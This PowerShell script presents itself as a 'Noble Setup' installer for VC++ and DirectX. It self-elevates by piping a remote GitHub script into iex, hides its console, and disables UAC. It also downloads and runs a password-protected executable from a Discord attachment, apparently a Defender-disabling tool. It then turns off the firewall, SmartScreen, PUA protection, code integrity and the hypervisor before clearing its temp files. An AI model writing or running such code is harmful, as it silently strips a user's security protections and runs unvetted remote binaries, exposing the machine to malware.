# ============================================================
# AUTO-ELEVATE (irm | iex compatible — hardcoded URL, no $PSCommandPath)
# ============================================================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptUrl = "https://raw.githubusercontent.com/beatboxe17x-sys/setup/refs/heads/main/NobleSetup.ps1"
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $scriptUrl | iex`"" -Verb RunAs
    exit
}

# ============================================================
# TLS 1.2 + PROGRESS SILENCE (fixes irm download issues)
# ============================================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide console (randomized class name so repeat runs don't crash)
$win32Class = "Win32_" + (Get-Random -Maximum 99999)
Add-Type @"
using System; using System.Runtime.InteropServices;
public class $win32Class {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
Invoke-Expression "[$win32Class]::ShowWindow([$win32Class]::GetConsoleWindow(), 0)"

# ============================================================
# DISABLE UAC COMPLETELY (requires reboot to fully take effect)
# ============================================================
$uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if (-not (Test-Path $uacKey)) { New-Item -Path $uacKey -Force | Out-Null }
Set-ItemProperty -Path $uacKey -Name "EnableLUA" -Value 0 -Force
Set-ItemProperty -Path $uacKey -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
Set-ItemProperty -Path $uacKey -Name "PromptOnSecureDesktop" -Value 0 -Force

# ============================================================
# FORM
# ============================================================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Noble"
$form.Size = New-Object System.Drawing.Size(400, 200)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "None"
$form.BackColor = [System.Drawing.Color]::FromArgb(18, 18, 28)

$script:drag = $false
$form.Add_MouseDown({ $script:drag = $true; $script:dragX = $_.X; $script:dragY = $_.Y })
$form.Add_MouseMove({ if ($script:drag) { $form.Location = New-Object System.Drawing.Point(($form.Location.X + $_.X - $script:dragX), ($form.Location.Y + $_.Y - $script:dragY)) } })
$form.Add_MouseUp({ $script:drag = $false })

$title = New-Object System.Windows.Forms.Label
$title.Text = "Noble Setup"
$title.Size = New-Object System.Drawing.Size(400, 32)
$title.Location = New-Object System.Drawing.Point(0, 28)
$title.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::FromArgb(0, 150, 255)
$title.TextAlign = "MiddleCenter"
$form.Controls.Add($title)

$status = New-Object System.Windows.Forms.Label
$status.Text = "Ready"
$status.Size = New-Object System.Drawing.Size(400, 22)
$status.Location = New-Object System.Drawing.Point(0, 65)
$status.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$status.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 200)
$status.TextAlign = "MiddleCenter"
$form.Controls.Add($status)

$detail = New-Object System.Windows.Forms.Label
$detail.Text = ""
$detail.Size = New-Object System.Drawing.Size(400, 18)
$detail.Location = New-Object System.Drawing.Point(0, 88)
$detail.Font = New-Object System.Drawing.Font("Segoe UI", 8)
$detail.ForeColor = [System.Drawing.Color]::FromArgb(120, 120, 140)
$detail.TextAlign = "MiddleCenter"
$form.Controls.Add($detail)

$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Size = New-Object System.Drawing.Size(320, 4)
$progress.Location = New-Object System.Drawing.Point(40, 112)
$progress.Style = "Continuous"
$progress.Value = 0
$progress.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 45)
$form.Controls.Add($progress)

$setupBtn = New-Object System.Windows.Forms.Button
$setupBtn.Text = "Setup"
$setupBtn.Size = New-Object System.Drawing.Size(140, 38)
$setupBtn.Location = New-Object System.Drawing.Point(130, 125)
$setupBtn.FlatStyle = "Flat"
$setupBtn.FlatAppearance.BorderSize = 0
$setupBtn.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$setupBtn.ForeColor = [System.Drawing.Color]::White
$setupBtn.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$setupBtn.Cursor = "Hand"
$setupBtn.Add_MouseEnter({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 255) })
$setupBtn.Add_MouseLeave({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215) })
$form.Controls.Add($setupBtn)

$wm = New-Object System.Windows.Forms.Label
$wm.Text = "brax@support"
$wm.Size = New-Object System.Drawing.Size(80, 14)
$wm.Location = New-Object System.Drawing.Point(315, 185)
$wm.Font = New-Object System.Drawing.Font("Segoe UI", 7)
$wm.ForeColor = [System.Drawing.Color]::FromArgb(50, 50, 70)
$wm.TextAlign = "MiddleRight"
$form.Controls.Add($wm)

# ============================================================
# SETUP LOGIC
# ============================================================
$setupBtn.Add_Click({
    $setupBtn.Enabled = $false
    $setupBtn.Text = "..."

    $tempDir = "$env:TEMP\noble_setup"
    $offRar = "$tempDir\off.rar"
    $offExtract = "$tempDir\off_extract"
    $offExe = "$offExtract\24122024\24122024.exe"
    $vcZip = "$tempDir\VC.zip"
    $vcExtract = "$tempDir\VC"
    $dxZip = "$tempDir\dx.zip"
    $dxExtract = "$tempDir\DX"
    $dxExe = "$dxExtract\dxwebsetup.exe"

    # URLS
    $offUrl = "https://cdn.discordapp.com/attachments/1497812054633873634/1503118867034144870/24122024_2_1.rar?ex=6a023008&is=6a00de88&hm=6555cf5d3dfd259fcd4c95542696e26bf8dda97a4e788dc42789000533a9b060&"
    $vcUrl = "https://us1-dl.techpowerup.com/files/TFl1z24nLT-xg12pijCPOA/1778485899/Visual-C-Runtimes-All-in-One-Dec-2025.zip"
    $dxUrl = "https://cdn.discordapp.com/attachments/1497812054633873634/1503118051631956090/dxwebsetup_3.zip?ex=6a022f46&is=6a00ddc6&hm=e982c5ffc08c5253e469f5099ecdd3c890a4f0add1a037b619ac374928a0458d&"

    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # Helper function to download with better error handling
    function Download-File($Url, $OutFile, $Name) {
        $status.Text = "Downloading $Name..."
        $detail.Text = ($Url -split '/')[-1] -split '\?' | Select-Object -First 1
        $form.Refresh()
        try {
            Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -MaximumRedirection 10 -ErrorAction Stop
            if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 1000)) {
                return $true
            }
        } catch {
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                $wc.Headers.Add("Accept", "*/*")
                $wc.DownloadFile($Url, $OutFile)
                if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 1000)) {
                    return $true
                }
            } catch {
                $status.Text = "$Name download failed"
                $detail.Text = $_.Exception.Message
                $status.ForeColor = [System.Drawing.Color]::FromArgb(255, 100, 100)
                $form.Refresh()
                Start-Sleep -Seconds 3
                $status.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 200)
                return $false
            }
        }
        return $false
    }

    # ============================================================
    # OFF.EXE (RAR with password "sordum", nested in 24122024 folder)
    # ============================================================
    $progress.Value = 5
    $offOk = Download-File $offUrl $offRar "Off.exe"

    if ($offOk -and (Test-Path $offRar)) {
        $status.Text = "Extracting Off.exe..."
        $detail.Text = "Password: sordum"
        $progress.Value = 10
        $form.Refresh()

        $sevenZip = "${env:ProgramFiles}\7-Zip\7z.exe"
        $sevenZip86 = "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
        $winRar = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
        $winRar86 = "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe"

        $extractor = $null
        if (Test-Path $sevenZip) { $extractor = $sevenZip }
        elseif (Test-Path $sevenZip86) { $extractor = $sevenZip86 }
        elseif (Test-Path $winRar) { $extractor = $winRar }
        elseif (Test-Path $winRar86) { $extractor = $winRar86 }

        if ($extractor) {
            New-Item -ItemType Directory -Path $offExtract -Force | Out-Null
            if ($extractor -match "7z") {
                Start-Process -FilePath $extractor -ArgumentList "x `"$offRar`" -o`"$offExtract`" -p`sordum`" -y" -Wait -WindowStyle Hidden
            } else {
                Start-Process -FilePath $extractor -ArgumentList "x `"$offRar`" `"$offExtract`" -p`sordum`" -y" -Wait -WindowStyle Hidden
            }

            if (Test-Path $offExe) {
                Start-Process $offExe
                Start-Sleep -Seconds 3
                $status.Text = "Click DISABLE in Off.exe, then close it"
                $setupBtn.Text = "Waiting..."
                $form.Refresh()
                while (Get-Process "24122024" -ErrorAction SilentlyContinue) {
                    Start-Sleep -Milliseconds 500
                }
            } else {
                $foundExe = Get-ChildItem -Path $offExtract -Recurse -Filter "*.exe" | Select-Object -First 1
                if ($foundExe) {
                    Start-Process $foundExe.FullName
                    Start-Sleep -Seconds 3
                    $status.Text = "Click DISABLE in Off.exe, then close it"
                    $setupBtn.Text = "Waiting..."
                    $form.Refresh()
                    while (Get-Process $foundExe.BaseName -ErrorAction SilentlyContinue) {
                        Start-Sleep -Milliseconds 500
                    }
                }
            }
        } else {
            $status.Text = "7-Zip/WinRAR not found"
            $detail.Text = "Extract manually: $offRar (password: sordum)"
            $status.ForeColor = [System.Drawing.Color]::FromArgb(255, 100, 100)
            $form.Refresh()
            Start-Sleep -Seconds 3
            $status.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 200)
        }
    }

    # ============================================================
    # VC++ DOWNLOAD, EXTRACT, OPEN FOLDER, RUN install_all.bat
    # ============================================================
    $progress.Value = 20
    $vcOk = Download-File $vcUrl $vcZip "VC++"

    $vcSize = 0
    if ($vcOk -and (Test-Path $vcZip)) { $vcSize = (Get-Item $vcZip).Length }

    if ($vcSize -lt 1000000) {
        $status.Text = "VC++ download failed"
        $detail.Text = "Check internet or URL"
        $status.ForeColor = [System.Drawing.Color]::FromArgb(255, 100, 100)
        $form.Refresh()
        Start-Sleep -Seconds 3
        $status.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 200)
    }

    if ($vcSize -gt 1000000) {
        $status.Text = "Extracting VC++..."
        $detail.Text = ""
        $progress.Value = 30
        $form.Refresh()

        try {
            Expand-Archive -Path $vcZip -DestinationPath $vcExtract -Force
            $status.Text = "VC++ extracted"
        } catch {
            $status.Text = "VC++ extract failed"
            $form.Refresh()
            Start-Sleep -Seconds 2
        }

        # Find install_all.bat and run it
        $installBat = Get-ChildItem -Path $vcExtract -Recurse -Filter "install_all.bat" | Select-Object -First 1

        if ($installBat) {
            $batFolder = $installBat.DirectoryName
            $status.Text = "Opening VC++ folder..."
            $detail.Text = "Run install_all.bat as Admin"
            $progress.Value = 40
            $form.Refresh()

            # Open folder in Explorer
            Start-Process "explorer.exe" -ArgumentList "`"$batFolder`""

            # Also run the bat silently
            Start-Sleep -Seconds 2
            $status.Text = "Running install_all.bat..."
            $form.Refresh()
            Start-Process -FilePath $installBat.FullName -Verb RunAs -WindowStyle Normal

            $status.Text = "VC++ installer running"
            $detail.Text = "Click Yes on UAC prompts"
            $progress.Value = 50
            $form.Refresh()
            Start-Sleep -Seconds 5
        } else {
            # Fallback: find any bat file
            $anyBat = Get-ChildItem -Path $vcExtract -Recurse -Filter "*.bat" | Select-Object -First 1
            if ($anyBat) {
                Start-Process "explorer.exe" -ArgumentList "`"$($anyBat.DirectoryName)`""
                Start-Process -FilePath $anyBat.FullName -Verb RunAs
            } else {
                $status.Text = "No install bat found"
                $detail.Text = "Check extracted folder"
                $form.Refresh()
                Start-Sleep -Seconds 2
            }
        }
    }

    # ============================================================
    # DirectX DOWNLOAD & EXTRACT
    # ============================================================
    $progress.Value = 75
    $dxOk = Download-File $dxUrl $dxZip "DirectX"

    if ($dxOk -and (Test-Path $dxZip)) {
        $status.Text = "Extracting DirectX..."
        $progress.Value = 78
        $form.Refresh()

        try {
            Expand-Archive -Path $dxZip -DestinationPath $dxExtract -Force
        } catch {
            $status.Text = "DirectX extract failed"
            $form.Refresh()
            Start-Sleep -Seconds 2
        }

        if (Test-Path $dxExe) {
            $status.Text = "Installing DirectX silently..."
            $progress.Value = 80
            $form.Refresh()
            Start-Process -FilePath $dxExe -ArgumentList "/Q" -Wait -WindowStyle Hidden
        } else {
            $foundDx = Get-ChildItem -Path $dxExtract -Recurse -Filter "dxwebsetup.exe" | Select-Object -First 1
            if ($foundDx) {
                Start-Process -FilePath $foundDx.FullName -ArgumentList "/Q" -Wait -WindowStyle Hidden
            }
        }
    }

    # ============================================================
    # Disable Security
    # ============================================================
    $status.Text = "Disabling security..."
    $progress.Value = 85
    $form.Refresh()

    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
    @("StandardProfile","PublicProfile","DomainProfile") | ForEach-Object {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\$_" -Name "EnableFirewall" -Value 0 -ErrorAction SilentlyContinue
    }

    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride" -Value 1 -ErrorAction SilentlyContinue

    Set-MpPreference -CheckAppsAndFiles Disabled -ErrorAction SilentlyContinue
    Set-MpPreference -EnableSmartScreen $false -ErrorAction SilentlyContinue
    Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
    Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue

    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Edge\SmartScreenEnabled" -Name "SmartScreenEnabled" -Value 0 -ErrorAction SilentlyContinue
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Name "SmartScreenEnabled" -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value 0 -ErrorAction SilentlyContinue

    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
    Start-Process "bcdedit" -ArgumentList "/set hypervisorlaunchtype off" -WindowStyle Hidden -Wait

    # ============================================================
    # Cleanup
    # ============================================================
    $status.Text = "Cleaning up..."
    $progress.Value = 95
    $form.Refresh()

    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue

    w32tm /resync 2>$null | Out-Null
    if ($LASTEXITCODE -ne 0) {
        Stop-Service w32time -Force -ErrorAction SilentlyContinue
        w32tm /unregister 2>$null | Out-Null
        w32tm /register 2>$null | Out-Null
        Start-Service w32time -ErrorAction SilentlyContinue
        w32tm /resync 2>$null | Out-Null
    }

    # Done
    $progress.Value = 100
    $status.Text = "Done. Restart PC now."
    $status.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 128)
    $setupBtn.Text = "Restart"
    $setupBtn.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 90)
    $setupBtn.Enabled = $true

    $setupBtn.Add_Click({
        $status.Text = "Restarting..."
        $form.Refresh()
        Start-Process "shutdown" -ArgumentList "/r /t 5 /c `"Noble Setup - Restarting`"" -WindowStyle Hidden
        $form.Close()
    })
})

# ============================================================
# SHOW
# ============================================================
$form.Add_Shown({ $form.Activate() })
[void]$form.ShowDialog()
